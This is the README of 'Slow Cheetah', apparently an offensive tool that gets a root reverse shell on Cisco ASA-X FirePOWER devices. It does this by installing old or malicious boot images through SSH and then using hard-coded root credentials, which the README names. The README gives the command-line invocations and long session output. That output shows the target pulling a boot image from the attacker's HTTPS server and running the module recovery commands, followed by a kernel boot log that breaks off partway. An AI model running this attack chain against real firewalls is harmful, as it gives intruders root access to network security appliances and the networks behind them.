# Slow Cheetah

Slow Cheetah is an exploit that initiates and catches a reverse shell from a Cisco ASA-X with FirePOWER Services device via SSH. Slow Cheetah works by either installing a Cisco provided [ASA FirePOWER module boot image](https://software.cisco.com/download/home/286283326/type/286277393/release/6.2.3) and then exploiting it for a root shell *or* installing an attacker created malicious ISO as the FirePOWER module boot image (see: [pinchme](https://github.com/jbaines-r7/pinchme)).

To install a boot image, the attacker must be highly privileged. The attack requires Cisco ASA CLI credentials *and* the enable password. However, once installed and exploited, the attacker has a root Linux system that can reach `outside` and `inside` of the ASA. In the following Cisco created image, the attacker finds themselves in the `ASA FirePOWER Inspection` bubble:

Exploiting the boot image has a major drawback in that it will not survive a reboot.

Cisco ASA-X with FirePOWER Services does not have any type of mechanism that identifies Cisco created boot images vs. non-Cisco boot images. There is no mechanism for preventing a user from using any version of the Cisco created boot images. While Cisco "hardeneded" the boot image version 7.0.0+ (see [CSCvu90861](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvu90861)), there is nothing stopping a user from simply installing old versions and establishing a root shell via hard coded credentials (root:cisco123) or command injection (not implemented here).

## Usage Examples

### Searching for boot images

Perhaps the most difficult problem for an attacker is finding and uploading a boot image. Downloading a Cisco boot image requires a contract which is unlikely to be available to most. [pinchme](https://github.com/jbaines-r7/pinchme) is meant to alleviate that, but it's possible the victim ASA already has a boot image on `disk0:/`. To search the disk for a boot image simply try using `--search`. For example:

```
albinolobster@ubuntu:~/slowcheetah$ python3 slowcheetah.py --rhost 10.12.70.253 --lhost 10.12.70.252 --username albinolobster --password labpass1 --search

   _____ __                 ________              __        __
  / ___// /___ _      __   / ____/ /_  ___  ___  / /_____ _/ /_
  \__ \/ / __ \ | /| / /  / /   / __ \/ _ \/ _ \/ __/ __ `/ __ \
 ___/ / / /_/ / |/ |/ /  / /___/ / / /  __/  __/ /_/ /_/ / / / /
/____/_/\____/|__/|__/   \____/_/ /_/\___/\___/\__/\__,_/_/ /_/

   🦞 ASA-X with FirePOWER Service Boot Image Root Shell 🦞

[+] Authenticating to 10.12.70.253:22 as albinolobster:labpass1
[+] Found: disk0:/asasfr-5500x-boot-6.2.3-4.img
[+] Found: disk0:/asasfr-5500x-boot-5.4.1-211.img
```

You can see above that we found two boot images.


### Uploading an image and achieving a shell

Perhaps the target lacks a boot image so you need to upload one yourself. No problem! Simply use `--upload-image`! This will copy the provided image onto the ASA via an HTTPS connect back, and then go about installing/exploiting as needed. Below is an example of uploading `asasfr-5500x-boot-5.4.1-21`, installing it, and exploiting it. I apologize that this example doesn't use `--enable_password` since my ASA-X uses a blank password! Also, you may be thinking "WHOA that's a lot of output" - just drop the `--verbose` flag and you won't see any of the ssh traffic.

```
albinolobster@ubuntu:~/slowcheetah$ python3 slowcheetah.py --rhost 10.12.70.253 --lhost 10.12.70.252 --http_addr 10.12.70.252 --username albinolobster --password labpass1 --upload_image ~/Desktop/asasfr-5500x-boot-5.4.1-211.img --verbose

   _____ __                 ________              __        __
  / ___// /___ _      __   / ____/ /_  ___  ___  / /_____ _/ /_
  \__ \/ / __ \ | /| / /  / /   / __ \/ _ \/ _ \/ __/ __ `/ __ \
 ___/ / / /_/ / |/ |/ /  / /___/ / / /  __/  __/ /_/ /_/ / / / /
/____/_/\____/|__/|__/   \____/_/ /_/\___/\___/\__/\__,_/_/ /_/

   🦞 ASA-X with FirePOWER Service Boot Image Root Shell 🦞

[+] Spinning up HTTPS server thread
Generating a RSA private key
..........................................................................................++++
.............................................................................................................................................++++
writing new private key to 'key.pem'
-----
[+] Server running on https://10.12.70.252:8443
[+] Authenticating to 10.12.70.253:22 as albinolobster:labpass1
User albinolobster logged in to ciscoasa
Logins over the last 1 days: 2.  Last login: 20:05:05 UTC Jun 29 2022 from 10.12.70.252
Failed logins since the last login: 0.  
Type help or '?' for a list of available commands.
ciscoasa> 
[+] Attempting to escalate to an enable prompt
en
Password: 
ciscoasa# copy /noconfirm https://10.12.70.252:8443/asasfr-5500x-boot-5.4.1-21$

10.12.70.253 - - [29/Jun/2022 13:27:34] "GET /asasfr-5500x-boot-5.4.1-211.img HTTP/1.0" 200 -
----------------------------------------
Exception happened during processing of request from ('10.12.70.253', 65075)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 316, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 347, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/http/server.py", line 647, in __init__
    super().__init__(*args, **kwargs)
  File "/usr/lib/python3.8/socketserver.py", line 747, in __init__
    self.handle()
  File "/usr/lib/python3.8/http/server.py", line 427, in handle
    self.handle_one_request()
  File "/usr/lib/python3.8/http/server.py", line 415, in handle_one_request
    method()
  File "/usr/lib/python3.8/http/server.py", line 654, in do_GET
    self.copyfile(f, self.wfile)
  File "/usr/lib/python3.8/http/server.py", line 853, in copyfile
    shutil.copyfileobj(source, outputfile)
  File "/usr/lib/python3.8/shutil.py", line 208, in copyfileobj
    fdst_write(buf)
  File "/usr/lib/python3.8/socketserver.py", line 826, in write
    self._sock.sendall(b)
  File "/usr/lib/python3.8/ssl.py", line 1204, in sendall
    v = self.send(byte_view[count:])
  File "/usr/lib/python3.8/ssl.py", line 1173, in send
    return self._sslobj.write(data)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
10.12.70.253 - - [29/Jun/2022 13:27:34] "GET /asasfr-5500x-boot-5.4.1-211.img HTTP/1.0" 200 -
Accessing https://10.12.70.252:8443/asasfr-5500x-boot-5.4.1-211.img...!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Writing file disk0:/asasfr-5500x-boot-5.4.1-211.img...
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
INFO: No digital signature found
41836544 bytes copied in 5.600 secs (8367308 bytes/sec)
ciscoasa# [+] Authenticating to 10.12.70.253:22 as albinolobster:labpass1
User albinolobster logged in to ciscoasa
Logins over the last 1 days: 3.  Last login: 20:34:20 UTC Jun 29 2022 from 10.12.70.252
Failed logins since the last login: 0.  
Type help or '?' for a list of available commands.
ciscoasa> 
[+] Attempting to escalate to an enable prompt
en
Password: 
ciscoasa# 
[+] Attempting to start the provided boot image
show module sfr

Mod  Card Type                                    Model              Serial No. 
---- -------------------------------------------- ------------------ -----------
 sfr Unknown                                      N/A                JAD221400UD

Mod  MAC Address Range                 Hw Version   Fw Version   Sw Version     
---- --------------------------------- ------------ ------------ ---------------
 sfr 00fc.ba44.5431 to 00fc.ba44.5431  N/A          N/A          

Mod  SSM Application Name           Status           SSM Application Version
---- ------------------------------ ---------------- --------------------------

Mod  Status             Data Plane Status     Compatibility
---- ------------------ --------------------- -------------
 sfr Unresponsive       Not Applicable        

ciscoasa# 
[+] This may take a few minutes - Booting recover image: disk0:/asasfr-5500x-boot-5.4.1-211.img
sw-module module sfr recover configure image disk0:/asasfr-5500x-boo$
ciscoasa# debug module-boot
debug module-boot  enabled at level 1
ciscoasa# sw-module module sfr recover boot

Module sfr will be recovered. This may erase all configuration and all data
on that device and attempt to download/install a new image for it. This may take
several minutes.

Recover module sfr? [confirm]
Recover issued for module sfr.
ciscoasa# Mod-sfr 13> ***
Mod-sfr 14> *** EVENT: Killing the Module.
Mod-sfr 15> *** TIME: 20:34:26 UTC Jun 29 2022
Mod-sfr 16> ***
Mod-sfr 17> ***
Mod-sfr 18> *** EVENT: The module is being recovered.
Mod-sfr 19> *** TIME: 20:34:28 UTC Jun 29 2022
Mod-sfr 20> ***
Mod-sfr 21> ***
Mod-sfr 22> *** EVENT: Creating the Disk Image...
Mod-sfr 23> *** TIME: 20:34:31 UTC Jun 29 2022
Mod-sfr 24> ***
Mod-sfr 25> ***
Mod-sfr 26> *** EVENT: Disk Image created successfully.
Mod-sfr 27> *** TIME: 20:36:29 UTC Jun 29 2022
Mod-sfr 28> ***
Mod-sfr 29> ***
Mod-sfr 30> *** EVENT: Start Parameters: Image: /mnt/disk0/vm/vm_1.img, ISO: -cdrom /mnt/disk0/
Mod-sfr 31> asasfr-5500x-boot-5.4.1-211.img, Num CPUs: 3, RAM: 2249MB, Mgmt MAC: 00:FC:BA:44:54
Mod-sfr 32> :31, CP MAC: 00:00:00:02:00:01, HDD: -drive file=/dev/sda,cache=none,if=virtio, Dev
Mod-sfr 33> ***
Mod-sfr 34> *** EVENT: Start Parameters Continued: RegEx Shared Mem: 0MB, Cmd Op: r, Shared Mem
Mod-sfr 35>  Key: 8061, Shared Mem Size: 16, Log Pipe: /dev/ttyS0_vm1, Sock: /dev/ttyS1_vm1, Me
Mod-sfr 36> m-Path: -mem-path /hugepages
Mod-sfr 37> *** TIME: 20:36:29 UTC Jun 29 2022
Mod-sfr 38> ***
Mod-sfr 39> Status: Mapping host 0x2aab37e00000 to VM with size 16777216
Mod-sfr 40> Warning: vlan 0 is not connected to host network
Mod-sfr 41> ISOLINUX 3.73 2009-01-25  Copyright (C) 1994-2008 H. Peter Anvin
Mod-sfr 42>                    Cisco SFR-BOOT-IMAGE and CX-BOOT-IMAGE for SFR - 5.4.1
Mod-sfr 43>     (WARNING: ALL DATA ON DISK 1 WILL BE LOST)
Mod-sfr 44> Loading bzImage..........................................................
Mod-sfr 45> Loading initramfs.gz...............................................................
Mod-sfr 46> ...................................................................................
Mod-sfr 47> ...................................................................................
Mod-sfr 48> ...................................................................................
Mod-sfr 49> ...................................................................................
Mod-sfr 50> ...................................................................................
Mod-sfr 51> ...................................................................................
Mod-sfr 52> ...................ready.
Mod-sfr 53> [    0.000000] BIOS EBDA/lowmem at: 0009fc00/0009fc00
Mod-sfr 54> [    0.000000] Initializing cgroup subsys cpuset
Mod-sfr 55> [    0.000000] Initializing cgroup subsys cpu
Mod-sfr 56> [    0.000000] Linux version 2.6.28.10.x86-target-64 (build@cel64build.esn.sourcefi
Mod-sfr 57> re.com) (gcc version 4.3.3 (MontaVista Linux Sourcery G++ 4.3-292) ) #1 SMP PREEMPT
Mod-sfr 58>  Mon Feb 2 00:15:14 EST 2015
Mod-sfr 59> [    0.000000] Command line: initrd=initramfs.gz console=ttyS0,9600 BOOT_IMAGE=bzIm
Mod-sfr 60> age 
Mod-sfr 61> [    0.000000] KERNEL supported cpus:
Mod-sfr 62> [    0.000000]   Intel GenuineIntel
Mod-sfr 63> [    0.000000]   AMD AuthenticAMD
Mod-sfr 64> [    0.000000]   Centaur CentaurHauls
Mod-sfr 65> [    0.000000] PAT WC disabled due to known CPU erratum.
Mod-sfr 66> [    0.000000] BIOS-provided physical RAM map:
Mod-sfr 67> [    0.000000]  BIOS-e820: 0000000000000000 - 000000000009fc00 (usable)
Mod-sfr 68> [    0.000000]  BIOS-e820: 000000000009fc00 - 00000000000a0000 (reserved)
Mod-sfr 69> [    0.000000]  BIOS-e820: 00000000000f0000 - 0000000000100000 (reserved)
Mod-sfr 70> [    0.000000]  BIOS-e820: 0000000000100000 - 000000008c8fe000 (usable)
Mod-sfr 71> [    0.000000]  BIOS-e820: 000000008c8fe000 - 000000008c900000 (reserved)
Mod-sfr 72> [    0.000000]  BIOS-e820: 00000000feffc000 - 00000000ff000000 (reserved)
Mod-sfr 73> [    0.000000]  BIOS-e820: 00000000fffc0000 - 0000000100000000 (reserved)
Mod-sfr 74> [    0.000000] DMI 2.4 present.
Mod-sfr 75> [    0.000000] last_pfn = 0x8c8fe max_arch_pfn = 0x3ffffffff
Mod-sfr 76> [    0.000000] init_memory_mapping: 0000000000000000-000000008c8fe000
Mod-sfr 77> [    0.000000] last_map_addr: 8c8fe000 end: 8c8fe000
Mod-sfr 78> [    0.000000] RAMDISK: 7dbe4000 - 7ffff3a6
Mod-sfr 79> [    0.000000] ACPI: RSDP 000FD900, 0014 (r0 BOCHS )
Mod-sfr 80> [    0.000000] ACPI: RSDT 8C8FE3E0, 0034 (r1 BOCHS  BXPCRSDT        1 BXPC        1
Mod-sfr 81> [    0.000000] ACPI: FACP 8C8FFF80, 0074 (r1 BOCHS  BXPCFACP        1 BXPC        1
Mod-sfr 82> [    0.000000] ACPI: DSDT 8C8FE420, 11A9 (r1   BXPC   BXDSDT        1 INTL 20100528
Mod-sfr 83> [    0.000000] ACPI: FACS 8C8FFF40, 0040
Mod-sfr 84> [    0.000000] ACPI: SSDT 8C8FF740, 07F7 (r1 BOCHS  BXPCSSDT        1 BXPC        1
Mod-sfr 85> [    0.000000] ACPI: APIC 8C8FF610, 0088 (r1 BOCHS  BXPCAPIC        1 BXPC        1
Mod-sfr 86> [    0.000000] ACPI: HPET 8C8FF5D0, 0038 (r1 BOCHS  BXPCHPET        1 BXPC        1
Mod-sfr 87> [    0.000000] No NUMA configuration found
Mod-sfr 88> [    0.000000] Faking a node at 0000000000000000-000000008c8fe000
Mod-sfr 89> [    0.000000] Bootmem setup node 0 0000000000000000-000000008c8fe000
Mod-sfr 90> [    0.000000]   NODE_DATA [0000000000001000 - 0000000000005fff]
Mod-sfr 91> [    0.000000]   bootmap [000000000000b000 -  000000000001c91f] pages 12
Mod-sfr 92> [    0.000000] (6 early reservations) ==> bootmem [0000000000 - 008c8fe000]
Mod-sfr 93> [    0.000000]   #0 [0000000000 - 0000001000]   BIOS data page ==> [0000000000 - 00
Mod-sfr 94> 00001000]
Mod-sfr 95> [    0.000000]   #1 [0000006000 - 0000008000]       TRAMPOLINE ==> [0000006000 - 00
Mod-sfr 96> 00008000]
Mod-sfr 97> [    0.000000]   #2 [0000200000 - 0000ae86dc]    TEXT DATA BSS ==> [0000200000 - 00
Mod-sfr 98> 00ae86dc]
Mod-sfr 99> [    0.000000]   #3 [007dbe4000 - 007ffff3a6]          RAMDISK ==> [007dbe4000 - 00
Mod-sfr 100> 7ffff3a6]
Mod-sfr 101> [    0.000000]   #4 [000009fc00 - 0000100000]    BIOS reserved ==> [000009fc00 - 0
Mod-sfr 102> 000100000]
Mod-sfr 103> [    0.000000]   #5 [0000008000 - 000000b000]          PGTABLE ==> [0000008000 - 0
Mod-sfr 104> 00000b000]
Mod-sfr 105> [    0.000000] found SMP MP-table at [ffff8800000fdac0] 000fdac0
Mod-sfr 106> [    0.000000] Zone PFN ranges:
Mod-sfr 107> [    0.000000]   DMA      0x00000000 -> 0x00001000
Mod-sfr 108> [    0.000000]   DMA32    0x00001000 -> 0x00100000
Mod-sfr 109> [    0.000000]   Normal   0x00100000 -> 0x00100000
Mod-sfr 110> [    0.000000] Movable zone start PFN for each node
Mod-sfr 111> [    0.000000] early_node_map[2] active PFN ranges
Mod-sfr 112> [    0.000000]     0: 0x00000000 -> 0x0000009f
Mod-sfr 113> [    0.000000]     0: 0x00000100 -> 0x0008c8fe
Mod-sfr 114> [    0.000000] ACPI: PM-Timer IO Port: 0xb008
Mod-sfr 115> [    0.000000] ACPI: LAPIC (acpi_id[0x00] lapic_id[0x00] enabled)
Mod-sfr 116> [    0.000000] ACPI: LAPIC (acpi_id[0x01] lapic_id[0x01] enabled)
Mod-sfr 117> [    0.000000] ACPI: LAPIC (acpi_id[0x02] lapic_id[0x02] enabled)
Mod-sfr 118> [    0.000000] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
Mod-sfr 119> [    0.000000] ACPI: IOAPIC (id[0x00] address[0xfec00000] gsi_base[0])
Mod-sfr 120> [    0.000000] IOAPIC[0]: apic_id 0, version 0, address 0xfec00000, GSI 0-23
Mod-sfr 121> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
Mod-sfr 122> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
Mod-sfr 123> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
Mod-sfr 124> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
Mod-sfr 125> [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
Mod-sfr 126> [    0.000000] ACPI: HPET id: 0x8086a201 base: 0xfed00000
Mod-sfr 127> [    0.000000] Using ACPI (MADT) for SMP configuration information
Mod-sfr 128> [    0.000000] SMP: Allowing 3 CPUs, 0 hotplug CPUs
Mod-sfr 129> [    0.000000] Allocating PCI resources starting at 90000000 (gap: 8c900000:726fc0
Mod-sfr 130> 00)
Mod-sfr 131> [    0.000000] PERCPU: Allocating 53248 bytes of per cpu data
Mod-sfr 132> [    0.000000] Built 1 zonelists in Node order, mobility grouping on.  Total pages
Mod-sfr 133> : 565389
Mod-sfr 134> [    0.000000] Policy zone: DMA32
Mod-sfr 135> [    0.000000] Kernel command line: initrd=initramfs.gz console=ttyS0,9600 BOOT_IM
Mod-sfr 136> AGE=bzImage 
Mod-sfr 137> [    0.000000] Initializing CPU#0
Mod-sfr 138> [    0.000000] PID hash table entries: 4096 (order: 12, 32768 bytes)
Mod-sfr 139> [    0.000000] TSC: Unable to calibrate against PIT
Mod-sfr 140> [    0.000000] TSC: HPET/PMTIMER calibration failed.
Mod-sfr 141> [    0.000000] Marking TSC unstable due to could not calculate TSC khz
Mod-sfr 142> [    0.000000] Console: colour VGA+ 80x25
Mod-sfr 143> [    0.000000] console [ttyS0] enabled
Mod-sfr 144> [    0.000000] allocated 23592960 bytes of page_cgroup
Mod-sfr 145> [    0.000000] please try cgroup_disable=memory option if you don't want
Mod-sfr 146> [    0.000000] Checking aperture...
Mod-sfr 147> [    0.000000] No AGP bridge found
Mod-sfr 148> [    0.000000] Memory: 2200244k/2302968k available (4733k kernel code, 388k absent
Mod-sfr 149> , 102336k reserved, 2572k data, 544k init)
Mod-sfr 150> [    0.000000] HPET: 3 timers in total, 0 timers will be used for per-cpu timer
Mod-sfr 151> [    0.001999] Calibrating delay loop... 1056.76 BogoMIPS (lpj=528384)
Mod-sfr 152> [    0.028995] Security Framework initialized
Mod-sfr 153> [    0.031995] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes)
Mod-sfr 154> [    0.038994] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes)
Mod-sfr 155> [    0.041993] Mount-cache hash table entries: 256
Mod-sfr 156> [    0.044993] Initializing cgroup subsys ns
Mod-sfr 157> [    0.045993] Initializing cgroup subsys cpuacct
Mod-sfr 158> [    0.046992] Initializing cgroup subsys memory
Mod-sfr 159> [    0.047992] CPU: L1 I cache: 32K, L1 D cache: 32K
Mod-sfr 160> [    0.049992] CPU: L2 cache: 4096K
Mod-sfr 161> [    0.050992] CPU 0/0x0 -> Node 0
Mod-sfr 162> [    0.051992] ACPI: Core revision 20080926
Mod-sfr 163> [    0.056991] Setting APIC routing to flat
Mod-sfr 164> [    0.061990] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
Mod-sfr 165> [    0.071989] CPU0: Intel QEMU Virtual CPU version 1.5.0 stepping 03
Mod-sfr 166> [    0.073988] Booting processor 1 APIC 0x1 ip 0x6000
Mod-sfr 167> [    0.000999] Initializing CPU#1
Mod-sfr 168> [    0.000999] Calibrating delay loop... 1241.08 BogoMIPS (lpj=620544)
Mod-sfr 169> [    0.000999] CPU: L1 I cache: 32K, L1 D cache: 32K
Mod-sfr 170> [    0.000999] CPU: L2 cache: 4096K
Mod-sfr 171> [    0.000999] CPU 1/0x1 -> Node 0
Mod-sfr 172> [    0.105983] CPU1: Intel QEMU Virtual CPU version 1.5.0 stepping 03
Mod-sfr 173> [    0.109983] Booting processor 2 APIC 0x2 ip 0x6000
Mod-sfr 174> [    0.000999] Initializing CPU#2
Mod-sfr 175> [    0.000999] Calibrating delay loop... 1249.28 BogoMIPS (lpj=624640)
Mod-sfr 176> [    0.000999] CPU: L1 I cache: 32K, L1 D cache: 32K
Mod-sfr 177> [    0.000999] CPU: L2 cache: 4096K
Mod-sfr 178> [    0.000999] CPU 2/0x2 -> Node 0
Mod-sfr 179> [    0.144977] CPU2: Intel QEMU Virtual CPU version 1.5.0 stepping 03
Mod-sfr 180> [    0.149977] Brought up 3 CPUs
Mod-sfr 181> [    0.150977] Total of 3 processors activated (3547.13 BogoMIPS).
Mod-sfr 182> [    0.154976] net_namespace: 1280 bytes
Mod-sfr 183> [    0.157975] NET: Registered protocol family 16
Mod-sfr 184> [    0.161975] ACPI: bus type pci registered
Mod-sfr 185> [    0.164974] PCI: Using configuration type 1 for base access
Mod-sfr 186> [    0.207968] ACPI: Interpreter enabled
Mod-sfr 187> [    0.209967] ACPI: (supports S0 S5)
Mod-sfr 188> [    0.211967] ACPI: Using IOAPIC for interrupt routing
Mod-sfr 189> [    0.225965] ACPI: No dock devices found.
Mod-sfr 190> [    0.227965] ACPI: PCI Root Bridge [PCI0] (0000:00)
Mod-sfr 191> [    0.235964] pci 0000:00:01.3: quirk: region b000-b03f claimed by PIIX4 ACPI
Mod-sfr 192> [    0.237963] pci 0000:00:01.3: quirk: region b100-b10f claimed by PIIX4 SMB
Mod-sfr 193> [    0.283956] ACPI: PCI Interrupt Link [LNKA] (IRQs 5 *10 11)
Mod-sfr 194> [    0.286956] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)
Mod-sfr 195> [    0.290955] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)
Mod-sfr 196> [    0.293955] ACPI: PCI Interrupt Link [LNKD] (IRQs 5 10 *11)
Mod-sfr 197> [    0.296954] ACPI: PCI Interrupt Link [LNKS] (IRQs *9)
Mod-sfr 198> [    0.302953] SCSI subsystem initialized
Mod-sfr 199> [    0.305953] usbcore: registered new interface driver usbfs
Mod-sfr 200> [    0.307953] usbcore: registered new interface driver hub
Mod-sfr 201> [    0.309952] usbcore: registered new device driver usb
Mod-sfr 202> [    0.312952] PCI: Using ACPI for IRQ routing
Mod-sfr 203> [    0.323000] cfg80211: Using static regulatory domain info
Mod-sfr 204> [    0.325000] cfg80211: Regulatory domain: US
Mod-sfr 205> [    0.327000] 	(start_freq - end_freq @ bandwidth), (max_antenna_gain, max_eirp)
Mod-sfr 206> [    0.329000] 	(2402000 KHz - 2472000 KHz @ 40000 KHz), (600 mBi, 2700 mBm)
Mod-sfr 207> [    0.331000] 	(5170000 KHz - 5190000 KHz @ 40000 KHz), (600 mBi, 2300 mBm)
Mod-sfr 208> [    0.333000] 	(5190000 KHz - 5210000 KHz @ 40000 KHz), (600 mBi, 2300 mBm)
Mod-sfr 209> [    0.335000] 	(5210000 KHz - 5230000 KHz @ 40000 KHz), (600 mBi, 2300 mBm)
Mod-sfr 210> [    0.337000] 	(5230000 KHz - 5330000 KHz @ 40000 KHz), (600 mBi, 2300 mBm)
Mod-sfr 211> [    0.340000] 	(5735000 KHz - 5835000 KHz @ 40000 KHz), (600 mBi, 3000 mBm)
Mod-sfr 212> [    0.342000] cfg80211: Calling CRDA for country: US
Mod-sfr 213> [    0.344000] NetLabel: Initializing
Mod-sfr 214> [    0.346000] NetLabel:  domain hash size = 128
Mod-sfr 215> [    0.348000] NetLabel:  protocols = UNLABELED CIPSOv4
Mod-sfr 216> [    0.350000] NetLabel:  unlabeled traffic allowed by default
Mod-sfr 217> [    0.352000] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
Mod-sfr 218> [    0.355000] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
Mod-sfr 219> [    0.364164] pnp: PnP ACPI init
Mod-sfr 220> [    0.365859] ACPI: bus type pnp registered
Mod-sfr 221> [    0.374116] pnp: PnP ACPI: found 9 devices
Mod-sfr 222> [    0.376788] ACPI: ACPI bus type pnp unregistered
Mod-sfr 223> [    0.390125] bus: 00 index 0 io port: [0x00-0xffff]
Mod-sfr 224> [    0.393460] bus: 00 index 1 mmio: [0x000000-0xffffffffffffffff]
Mod-sfr 225> [    0.397121] NET: Registered protocol family 2
Mod-sfr 226> [    0.409163] IP route cache hash table entries: 131072 (order: 8, 1048576 bytes)
Mod-sfr 227> [    0.419407] TCP established hash table entries: 524288 (order: 11, 8388608 byte
Mod-sfr 228> s)
Mod-sfr 229> [    0.431170] TCP bind hash table entries: 65536 (order: 8, 1048576 bytes)
Mod-sfr 230> [    0.435114] TCP: Hash tables configured (established 524288 bind 65536)
Mod-sfr 231> [    0.439109] TCP reno registered
Mod-sfr 232> [    0.445162] NET: Registered protocol family 1
Mod-sfr 233> [    0.448118] checking if image is initramfs... it is
Mod-sfr 234> [    6.515123] Freeing initrd memory: 36972k freed
Mod-sfr 235> [    6.565075] Microcode Update Driver: v2.00 <tigran@aivazian.fsnet.co.uk>, Peter
Mod-sfr 236>  Oruba
Mod-sfr 237> [    6.583025] HugeTLB registered 2 MB page size, pre-allocated 0 pages
Mod-sfr 238> [    6.588045] VFS: Disk quotas dquot_6.5.1
Mod-sfr 239> [    6.590422] Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
Mod-sfr 240> [    6.599486] msgmni has been set to 4369
Mod-sfr 241> [    6.607037] alg: No test for stdrng (krng)
Mod-sfr 242> [    6.609663] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 252
Mod-sfr 243> [    6.613456] io scheduler noop registered
Mod-sfr 244> [    6.615502] io scheduler anticipatory registered
Mod-sfr 245> [    6.617854] io scheduler deadline registered
Mod-sfr 246> [    6.620422] io scheduler cfq registered (default)
Mod-sfr 247> [    6.622832] LTT : ltt-relay init
Mod-sfr 248> [    6.624570] ltt-control init
Mod-sfr 249> [    6.657473] LTT : ltt-kprobes init
Mod-sfr 250> [    6.659431] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
Mod-sfr 251> [    6.662410] pci 0000:00:01.0: PIIX3: Enabling Passive Release
Mod-sfr 252> [    6.665444] pci 0000:00:01.0: Activating ISA DMA hang workarounds
Mod-sfr 253> [    6.673490] pci_hotplug: PCI Hot Plug PCI Core version: 0.5
Mod-sfr 254> [    6.681720] processor ACPI_CPU:00: registered as cooling_device0
Mod-sfr 255> [    6.686115] processor ACPI_CPU:01: registered as cooling_device1
Mod-sfr 256> [    6.689519] processor ACPI_CPU:02: registered as cooling_device2
Mod-sfr 257> [    6.740065] Non-volatile memory driver v1.2
Mod-sfr 258> [    6.741429] Linux agpgart interface v0.103
Mod-sfr 259> [    6.744946] [drm] Initialized drm 1.1.0 20060810
Mod-sfr 260> [    6.747363] Serial: 8250/16550 driver4 ports, IRQ sharing enabled
Mod-sfr 261> [    6.998448] serial8250: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
Mod-sfr 262> [    7.250470] serial8250: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
Mod-sfr 263> [    7.258099] 00:06: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
Mod-sfr 264> [    7.263082] 00:07: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
Mod-sfr 265> [    7.268047] Floppy drive(s): fd0 is 1.44M, fd1 is 1.44M
Mod-sfr 266> [    7.283445] FDC 0 is a S82078B
Mod-sfr 267> [    7.309745] brd: module loaded
Mod-sfr 268> [    7.321137] loop: module loaded
Mod-sfr 269> [    7.323497] Intel(R) Gigabit Ethernet Network Driver - version 1.2.45-k2
Mod-sfr 270> [    7.326873] Copyright (c) 2008 Intel Corporation.
Mod-sfr 271> [    7.329960] pcnet32.c:v1.35 21.Apr.2008 tsbogend@alpha.franken.de
Mod-sfr 272> [    7.334041] e100: Intel(R) PRO/100 Network Driver, 3.5.23-k6-NAPI
Mod-sfr 273> [    7.336614] e100: Copyright(c) 1999-2006 Intel Corporation
Mod-sfr 274> [    7.340499] sky2 driver version 1.22
Mod-sfr 275> [    7.345314] console [netcon0] enabled
Mod-sfr 276> [    7.347210] netconsole: network logging started
Mod-sfr 277> [    7.350768] input: Macintosh mouse button emulation as /devices/virtual/input/i
Mod-sfr 278> nput0
Mod-sfr 279> [    7.358333] Loading iSCSI transport class v2.0-870.
Mod-sfr 280> [    7.368727] Driver 'sd' needs updating - please use bus_type methods
Mod-sfr 281> [    7.372517] Driver 'sr' needs updating - please use bus_type methods
Mod-sfr 282> [    7.380495] scsi0 : ata_piix
Mod-sfr 283> [    7.384480] scsi1 : ata_piix
Mod-sfr 284> [    7.387284] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc0c0 irq 14
Mod-sfr 285> [    7.390459] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc0c8 irq 15
Mod-sfr 286> [    7.547439] ata1.00: ATA-7: QEMU HARDDISK, 1.5.0, max UDMA/100
Mod-sfr 287> [    7.550404] ata1.00: 6291456 sectors, multi 16: LBA48 
Mod-sfr 288> [    7.554306] ata1.00: configured for MWDMA2
Mod-sfr 289> [    7.710419] ata2.00: ATAPI: QEMU DVD-ROM, 1.5.0, max UDMA/100
Mod-sfr 290> [    7.714473] ata2.00: configured for MWDMA2
Mod-sfr 291> [    7.719014] isa bounce pool size: 16 pages
Mod-sfr 292> [    7.720429] scsi 0:0:0:0: Direct-Access     ATA      QEMU HARDDISK    1.5. PQ: 
Mod-sfr 293> 0 ANSI: 5
Mod-sfr 294> [    7.725800] sd 0:0:0:0: [sda] 6291456 512-byte hardware sectors: (3.22 GB/3.00 
Mod-sfr 295> GiB)
Mod-sfr 296> [    7.729611] sd 0:0:0:0: [sda] Write Protect is off
Mod-sfr 297> [    7.733066] sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn'
Mod-sfr 298> t support DPO or FUA
Mod-sfr 299> [    7.736509] sd 0:0:0:0: [sda] 6291456 512-byte hardware sectors: (3.22 GB/3.00 
Mod-sfr 300> GiB)
Mod-sfr 301> [    7.740368] sd 0:0:0:0: [sda] Write Protect is off
Mod-sfr 302> [    7.742835] sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn'
